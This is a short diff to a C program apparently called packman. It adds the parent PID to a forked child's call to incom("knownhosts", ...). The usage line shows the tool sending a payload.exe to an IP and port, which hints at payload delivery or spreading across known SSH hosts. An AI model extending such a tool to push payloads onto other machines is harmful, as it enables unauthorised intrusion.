@@ -27,12 +27,13 @@ Example: packman 192.168.0.1:1337 ~/payload.exe \n\n\
 int forking ()
 {
 	printf("\nstart fork\n");
+	pid_t parent = getpid();
 	pid_t pid = fork();
 	if (pid == 0)
 	{
 		// child process
 	    printf("child process");
-	    incom("knownhosts");
+	    incom("knownhosts", parent);
 	    printf("child died");
 	    exit(0);
 	    return 0;
